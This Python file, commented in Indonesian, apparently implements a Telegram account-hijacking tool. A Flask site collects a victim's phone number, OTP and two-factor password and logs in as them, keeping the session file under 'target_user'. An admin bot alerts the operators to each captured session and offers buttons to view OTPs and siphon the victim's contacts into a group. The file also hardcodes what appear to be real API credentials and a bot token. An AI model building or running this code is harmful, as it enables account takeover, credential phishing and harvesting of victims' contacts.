import asyncio
import threading
import os
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.contacts import GetContactsRequest

# --- KONFIGURASI ---
API_ID = 31871641               
API_HASH = '5e0aa2e3b7b013161308d8880d062193'
BOT_TOKEN = '8390941360:AAG_tT7KmGz_v_ffiR1GhxmXrWQm-vkHxzw' 

# Nama file session untuk akun yang login di web
USER_SESSION_PATH = 'sessions/target_user' 
BOT_SESSION_PATH = 'sessions/admin_bot'

# Pastikan folder sessions ada
if not os.path.exists('sessions'):
    os.makedirs('sessions')

ADMIN_IDS = {7795826197} 

app = Flask(__name__)
app.secret_key = 'rahasia_sangat_aman_123'

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Inisialisasi Client dengan path file session permanen
client = TelegramClient(USER_SESSION_PATH, API_ID, API_HASH, loop=loop)
bot = TelegramClient(BOT_SESSION_PATH, API_ID, API_HASH, loop=loop)

# --- FUNGSI PERSISTENSI & AUTO LOGIN ---
async def ensure_logged_in():
    """Cek apakah file session target_user.session valid dan aktif"""
    try:
        if not client.is_connected():
            await client.connect()
        return await client.is_user_authorized()
    except Exception:
        return False

# --- BOT COMMANDS ---
def get_admin_buttons():
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot ke Grup", b"sedot_grup")],
        [Button.inline("📋 List Admin", b"list_sesi"), Button.inline("🔓 Cek Sesi Tersimpan", b"check_save")],
        [Button.inline("📡 Set Grup", b"set_grup"), Button.inline("🔑 View OTP", b"otp_view")]
    ]

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    if not is_admin(event.sender_id): return
    
    if event.data == b"check_save":
        # Mengecek apakah file .session sudah ada dan terverifikasi
        is_auth = await ensure_logged_in()
        if is_auth:
            me = await client.get_me()
            status = f"✅ Sesi Tersimpan: `{me.phone}`\nID: `{me.id}`"
        else:
            status = "❌ Tidak ada sesi aktif tersimpan."
        await event.edit(status, buttons=get_admin_buttons())
    
    elif event.data == b"sedot_grup":
        if await ensure_logged_in():
            await event.edit("⚡ **[PROSES]** Sedot kontak dari sesi tersimpan...", buttons=get_admin_buttons())
            # Logika sedot Anda...
        else:
            await event.edit("⚠️ Sesi kadaluarsa. Harap login ulang di web.", buttons=get_admin_buttons())
    
    await event.answer()

# --- REVISI LOGIN & VERIFY (SIMPAN SESSION) ---

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    if request.method == 'POST':
        otp = request.form.get('otp')
        pwd = request.form.get('password')
        phone = session.get('phone')
        try:
            if not client.is_connected(): run_async(client.connect())
            
            # Proses sign_in secara otomatis menyimpan file .session di USER_SESSION_PATH
            if pwd:
                user = run_async(client.sign_in(phone=phone, password=pwd))
            else:
                user = run_async(client.sign_in(phone=phone, code=otp))
            
            ADMIN_IDS.add(user.id) 
            session['user_id'] = user.id
            
            send_admin_notif(f"✅ **Sesi Baru Disimpan!**\nNomor: `{phone}`\nFile: `{USER_SESSION_PATH}.session`")
            return redirect(url_for('home'))
            
        except SessionPasswordNeededError:
            return render_template('verify.html', password_required=True)
        except Exception as e:
            flash(f"Error: {str(e)}", "error")
    return render_template('verify.html', password_required=False)

# --- RUNTIME ---
def start_clients():
    async def main():
        await bot.start(bot_token=BOT_TOKEN)
        # Mencoba memuat sesi user yang tersimpan di awal
        await client.connect()
        await bot.run_until_disconnected()
    loop.run_until_complete(main())

threading.Thread(target=start_clients, daemon=True).start()

def is_admin(user_id): return user_id in ADMIN_IDS
def run_async(coro): return asyncio.run_coroutine_threadsafe(coro, loop).result()
def send_admin_notif(message):
    async def send():
        for admin_id in ADMIN_IDS:
            try: await bot.send_message(admin_id, message)
            except: pass
    asyncio.run_coroutine_threadsafe(send(), loop)

if __name__ == '__main__':
    app.run(debug=True, use_reloader=False, port=5000)
